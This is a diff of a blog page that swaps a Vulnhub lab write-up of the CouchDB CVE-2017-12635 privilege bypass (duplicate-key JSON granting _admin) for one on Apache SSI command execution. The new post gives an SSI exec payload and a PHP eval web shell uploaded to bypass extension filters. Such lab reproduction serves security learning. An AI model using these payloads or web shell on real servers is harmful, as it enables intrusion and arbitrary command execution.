@@ -361,7 +361,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/21/1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/20/1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -380,7 +380,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/07/21/1/" itemprop="url">利用Vulnhub复现漏洞 - Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</a></h1>
+                <a class="post-title-link" href="/2019/07/20/1/" itemprop="url">利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞</a></h1>
         
 
         <div class="post-meta">
@@ -392,8 +392,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-21T15:05:35+08:00">
-                2019-07-21
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-20T16:05:18+08:00">
+                2019-07-20
               </time>
             
 
@@ -432,9 +432,11 @@
       
         
           
-            <p><strong><em>利用Vulnhub复现漏洞 - Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</em></strong></p>
-<p>*<em>简介：由于CouchDB基于Erlang的JSON解析器和基于JavaScript的JSON解析器的不同，可以在数据库中提交带有用于访问控制的角色的重复键的_users文档，包括表示管理用户的特殊情况_admin角色。 与CVE-2017-12636（远程执行代码）结合使用，可以使非管理员用户能够以数据库系统用户的身份访问服务器上的任意shell命令。 *</em></p>
-<p><strong>漏洞复现：</strong><br>首先先打开网站进行抓包之后在后面添加一句 密码和用户名换成自己的<br>{<br>  “type”: “user”,<br>  “name”: “chen”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “chen”<br>}<br>如图：<br><img src="https://note.youdao.com/yws/public/resource/a28be70fc691df6a0bbaf6b8afd0256a/xmlnote/BE983ED0D54C44B2842D9C141C0633BF/4072" alt="h" title="h"><br>之后访问：<a href="http://192.168.199.217:5984/_utils/就可以看见刚刚创建的用户名了" target="_blank" rel="noopener">http://192.168.199.217:5984/_utils/就可以看见刚刚创建的用户名了</a><br><img src="https://note.youdao.com/yws/public/resource/a28be70fc691df6a0bbaf6b8afd0256a/xmlnote/159BF9F3CDEC43D98426474CE5ACD11D/4066" alt="h" title="h"></p>
+            <p><strong>利用Vulnhub复现漏洞 - Apache SSI 远程命令执行漏洞</strong></p>
+<p><strong>漏洞复现：</strong><br>1.访问<a href="http://192.168.199.151:8080/upload.php" target="_blank" rel="noopener">http://192.168.199.151:8080/upload.php</a><br>首先上传一个php文件可以发现不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，就可以上传一个shtml文件</p>
+<p><strong>方法一：</strong></p>
+<p>   上传一个shtml文件可保存为shell.shtml文件通过浏览器上传<br>可以生成一个后缀名为shtml的文件内容为!–#exec cmd=”id” –&gt; （执行任意命令）<br>在网站里面上传刚刚生成的文件 之后在8080后面加自己的文件名，显示上传成功 如下图：<br><img src="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/CE4C8C77B04A41338AC2F0CA3B98B2AA/4090" alt="h" title="h"></p>
+<p><strong>方法二：</strong><br>上传一个php木马内容为：<?php @eval($_POST[value]);?> 文件后缀名为php3<br>上传到网站上之后用菜刀（蚁剑）连接就可以了  如下图：<br><img src="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/83D7740383994602BB0CFC315C676B4F/4091" alt="g" title="g"><br><img src="https://note.youdao.com/yws/public/resource/26b18fc5f88fb731f3caf1f099fa6894/xmlnote/43D7780570614E6D881E59B15D3F32BF/4095" alt="h" title="h"></p>
 
           
         
